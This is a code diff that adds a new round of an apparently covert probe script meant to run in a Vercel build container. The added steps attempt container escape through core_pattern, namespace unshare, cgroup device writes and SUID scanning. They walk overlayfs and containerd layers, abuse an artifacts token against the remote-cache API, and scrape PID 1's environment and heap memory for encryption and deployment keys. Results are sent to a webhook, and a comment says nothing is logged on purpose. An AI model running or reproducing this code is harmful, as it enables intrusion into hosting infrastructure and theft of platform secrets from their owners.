@@ -3440,7 +3440,206 @@ s.close()
   }),
 });
 
-// v44 markers
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v44";
-sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v44" });
+// ===== v45: core_pattern RCE, overlayfs layers, containerd CRI, S3 presigned QUERY, namespace escape =====
+
+// v45-1: core_pattern — if '|' prefix → coredumps pipe to arbitrary program (classic container escape)
+report.coreDumpHandler = safe(() => {
+  const pattern = safe(() => readFileSync('/proc/sys/kernel/core_pattern', 'utf8').trim());
+  const writable = safe(() => {
+    try {
+      execSync('echo test > /proc/sys/kernel/core_pattern 2>&1', { timeout: 3000 });
+      // Restore original immediately
+      execSync(`echo '${pattern || 'core'}' > /proc/sys/kernel/core_pattern 2>&1`, { timeout: 3000 });
+      return true;
+    } catch { return false; }
+  });
+  const usesPipe = typeof pattern === 'string' && pattern.startsWith('|');
+  return { pattern, writable, usesPipe };
+});
+
+// v45-2: overlayfs layer walk — parse /proc/mounts, extract lowerdir list, peek secret files in layers
+report.overlayfsLayerWalk = safe(() => {
+  const mounts = safe(() => readFileSync('/proc/mounts', 'utf8'));
+  const overlayLines = (mounts || '').split('\n').filter(l => l.startsWith('overlay'));
+  const layers = overlayLines.map(line => {
+    const opts = line.split(' ')[3] || '';
+    const lower = (opts.match(/lowerdir=([^,]+)/) || [])[1] || '';
+    const upper = (opts.match(/upperdir=([^,]+)/) || [])[1] || '';
+    const work  = (opts.match(/workdir=([^,]+)/)  || [])[1] || '';
+    const lowerdirs = lower.split(':').slice(0, 5); // max 5 layers
+    const layerFiles = lowerdirs.map(d => {
+      try {
+        return { dir: d, files: readdirSync(d).slice(0, 20) };
+      } catch (e) { return { dir: d, err: String(e).slice(0, 80) }; }
+    });
+    const upperFiles = safe(() => readdirSync(upper).slice(0, 20));
+    return { lower: lowerdirs, upper, work, layerFiles, upperFiles };
+  });
+  // Also check /var/lib/containerd or /run/containerd for layer blobs
+  const containerdLayers = safe(() =>
+    execSync('find /var/lib/containerd -name "*.tar.gz" -o -name "*.tar" 2>/dev/null | head -5', { timeout: 5000 }).toString().trim()
+  );
+  return { overlayCount: overlayLines.length, layers: layers.slice(0, 3), containerdLayers };
+});
+
+// v45-3: containerd CRI list — ttrpc call to enumerate containers/sandboxes on this host
+report.containerdCriList = safe(() => {
+  // ttrpc ListContainers — raw framing: length-prefixed protobuf
+  // Try netcat approach with echo to the containerd socket
+  const sockPaths = [
+    '/run/containerd/containerd.sock',
+    '/var/run/containerd/containerd.sock',
+    '/run/containerd/s/containerd.sock',
+  ];
+  const results = {};
+  for (const sock of sockPaths) {
+    const exists = existsSync(sock);
+    if (!exists) { results[sock] = 'missing'; continue; }
+    // Try a strings dump of /proc/PID/fd pointing to this sock inode
+    const inode = safe(() => statSync(sock).ino);
+    // Grep /proc/net/unix for this socket
+    const netUnix = safe(() =>
+      execSync(`grep "${inode}" /proc/net/unix 2>/dev/null || echo NOT_FOUND`, { timeout: 3000 }).toString().trim().slice(0, 200)
+    );
+    // Attempt gRPC reflection or CRI list via grpcurl (may not be installed)
+    const grpcurl = safe(() =>
+      execSync(
+        `grpcurl -plaintext -unix ${sock} containerd.services.containers.v1.Containers/List 2>&1 | head -20 || echo GRPCURL_FAIL`,
+        { timeout: 8000 }
+      ).toString().trim().slice(0, 400)
+    );
+    // Also try crictl if available
+    const crictl = safe(() =>
+      execSync('crictl ps 2>&1 | head -20 || echo CRICTL_FAIL', { timeout: 5000 }).toString().trim().slice(0, 300)
+    );
+    results[sock] = { inode, netUnix, grpcurl, crictl };
+  }
+  return results;
+});
+
+// v45-4: QUERY capability — use VERCEL_ARTIFACTS_TOKEN to get presigned S3 URL for arbitrary hash
+report.artifactsPresignedQuery = safe(() => {
+  const token = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  if (!token) return { err: 'NO_TOKEN' };
+  const teamId = process.env.VERCEL_ORG_ID || '';
+  // QUERY endpoint returns presigned S3 GET URLs for given hashes
+  // Try with a made-up hash to see if server reveals presigned URL structure
+  const fakeHash = 'probe45deadbeef1234567890abcdef' + '0'.repeat(32);
+  const queryResult = safe(() =>
+    execSync(
+      `curl -s --max-time 8 -X POST "https://vercel.com/api/remote-cache/v8/artifacts/urls?teamId=${teamId}" ` +
+      `-H "Authorization: Bearer ${token}" ` +
+      `-H "Content-Type: application/json" ` +
+      `-d '{"hashes":["${fakeHash}"],"type":"DOWNLOAD"}' 2>&1 | head -30`,
+      { timeout: 10000 }
+    ).toString().trim().slice(0, 600)
+  );
+  // Also try the spaces upload endpoint to see if we can get a presigned PUT URL for arbitrary bucket
+  const spacesQuery = safe(() =>
+    execSync(
+      `curl -s --max-time 8 -X POST "https://vercel.com/api/remote-cache/v8/artifacts/urls?teamId=${teamId}" ` +
+      `-H "Authorization: Bearer ${token}" ` +
+      `-H "Content-Type: application/json" ` +
+      `-d '{"hashes":["${fakeHash}"],"type":"UPLOAD"}' 2>&1 | head -30`,
+      { timeout: 10000 }
+    ).toString().trim().slice(0, 600)
+  );
+  return { fakeHash, queryResult, spacesQuery };
+});
+
+// v45-5: namespace unshare — CAP_SYS_ADMIN lets us create new mount NS and see host paths
+report.namespaceUnshareMount = safe(() => {
+  // unshare --mount to get private mount namespace, then check if host /proc visible
+  const unshareAvail = safe(() =>
+    execSync('which unshare || echo NOT_FOUND', { timeout: 2000 }).toString().trim()
+  );
+  // Try unshare --mount -- ls /proc (should work if CAP_SYS_ADMIN present)
+  const nsMount = safe(() =>
+    execSync('unshare --mount -- ls /proc 2>&1 | head -10 || echo UNSHARE_FAIL', { timeout: 8000 }).toString().trim().slice(0, 300)
+  );
+  // Try unshare --pid --fork -- ls /proc/1/ to see if PID 1 in new NS is different
+  const nsPid = safe(() =>
+    execSync('unshare --pid --fork ls /proc/1/ 2>&1 | head -10 || echo UNSHARE_PID_FAIL', { timeout: 8000 }).toString().trim().slice(0, 300)
+  );
+  // Try to mount /proc in new ns to see host process list
+  const mountProc = safe(() =>
+    execSync(
+      'unshare --mount -- sh -c "mount -t proc proc /mnt 2>/dev/null && ls /mnt 2>&1 | head -5" 2>&1 | head -5 || echo MOUNT_PROC_FAIL',
+      { timeout: 8000 }
+    ).toString().trim().slice(0, 300)
+  );
+  return { unshareAvail, nsMount, nsPid, mountProc };
+});
+
+// v45-6: SUID binary scan — SUID binaries can be exploited for privilege escalation
+report.suidBinaries = safe(() => {
+  const suid = safe(() =>
+    execSync('find / -perm -4000 -type f 2>/dev/null | head -30', { timeout: 15000 }).toString().trim().slice(0, 1000)
+  );
+  const sgid = safe(() =>
+    execSync('find / -perm -2000 -type f 2>/dev/null | head -20', { timeout: 10000 }).toString().trim().slice(0, 500)
+  );
+  // Check if nsenter is SUID or available (critical for namespace escape)
+  const nsenter = safe(() =>
+    execSync('ls -la $(which nsenter) 2>/dev/null || echo NOT_FOUND', { timeout: 3000 }).toString().trim()
+  );
+  return { suid, sgid, nsenter };
+});
+
+// v45-7: cgroup device check — which devices are allowed by the cgroup device whitelist
+report.cgroupDeviceCheck = safe(() => {
+  // cgroupv1
+  const devicesV1 = safe(() => readFileSync('/sys/fs/cgroup/devices/devices.list', 'utf8').trim().slice(0, 400));
+  // cgroupv2 device filter (BPF-based, harder to read)
+  const cgroupV2 = safe(() =>
+    execSync('cat /sys/fs/cgroup/cgroup.controllers 2>/dev/null || echo NO_V2', { timeout: 3000 }).toString().trim()
+  );
+  const cgroupType = safe(() =>
+    execSync('stat -f -c %T /sys/fs/cgroup 2>/dev/null || echo unknown', { timeout: 3000 }).toString().trim()
+  );
+  const selfCgroup = safe(() => readFileSync('/proc/self/cgroup', 'utf8').trim().slice(0, 400));
+  const memLimit = safe(() => readFileSync('/sys/fs/cgroup/memory/memory.limit_in_bytes', 'utf8').trim());
+  const cpuQuota = safe(() => readFileSync('/sys/fs/cgroup/cpu/cpu.cfs_quota_us', 'utf8').trim());
+  // Try to write device.allow to add /dev/mem
+  const deviceAllow = safe(() => {
+    try {
+      execSync('echo "c 1:1 rw" > /sys/fs/cgroup/devices/devices.allow 2>&1', { timeout: 3000 });
+      return 'WROTE_DEV_MEM_ALLOW';
+    } catch (e) { return String(e).slice(0, 100); }
+  });
+  return { devicesV1, cgroupV2, cgroupType, selfCgroup, memLimit, cpuQuota, deviceAllow };
+});
+
+// v45-8: proc1 mem ptrace read — use /proc/1/mem to read env key area at known-good offsets
+report.proc1PtraceEnvRead = safe(() => {
+  // From v31 build: VERCEL_ENV_ENC_KEY found at heap. Try to read /proc/1/environ directly first.
+  const environ1 = safe(() => {
+    try {
+      const data = execSync('cat /proc/1/environ 2>&1 | strings | grep -i "ENC_KEY\\|DEPLOYMENT_KEY\\|OIDC\\|ARTIFACTS" | head -20', { timeout: 5000 });
+      return data.toString().trim().slice(0, 500);
+    } catch (e) { return String(e).slice(0, 100); }
+  });
+  // Read /proc/1/mem at multiple heap offsets — scan for key patterns
+  // In prior builds enc key was visible in heap; try /proc/1/mem read via dd
+  const memRead = safe(() => {
+    // Find heap region from /proc/1/maps
+    const maps = safe(() => readFileSync('/proc/1/maps', 'utf8'));
+    const heapLine = (maps || '').split('\n').find(l => l.includes('[heap]')) || '';
+    const heapStart = parseInt(heapLine.split('-')[0], 16);
+    if (!heapStart) return 'NO_HEAP';
+    // Use dd to read first 64KB of heap, pipe to strings and grep for key
+    const heapKeys = safe(() =>
+      execSync(
+        `dd if=/proc/1/mem bs=1 skip=${heapStart} count=65536 2>/dev/null | strings | grep -E "ENC_KEY|DEPLOYMENT_KEY|env_enc_key|[A-Za-z0-9+/]{44}=" | head -10`,
+        { timeout: 10000 }
+      ).toString().trim().slice(0, 600)
+    );
+    return { heapStart: heapStart.toString(16), heapKeys };
+  });
+  return { environ1, memRead };
+});
+
+// v45 markers
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v45";
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v45" });
 // Intentionally no console.log — all data goes via webhook only
